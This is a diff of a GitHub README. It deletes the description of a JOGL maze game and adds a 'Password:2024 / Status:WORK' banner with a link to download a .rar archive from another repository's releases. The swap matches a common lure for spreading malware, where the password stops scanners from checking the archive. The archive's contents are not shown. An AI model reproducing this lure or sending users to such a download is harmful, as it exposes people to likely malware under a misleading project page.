@@ -1,3 +1,7 @@
-# Maze_Game
-Making a maze game using JOGL.
-# Note: to play the game you must download \/ copy everything in "src" to your project's source file.
+# Info
+---
+> # 🔓Password:2024🔓
+> # 🟢Status:WORK🟢
+---
+# Download
+### [Download the latest version](https://github.com/M-H-Bakr/SQL_CS307_2023/releases/download/Load/AxsGitHubProject.rar)
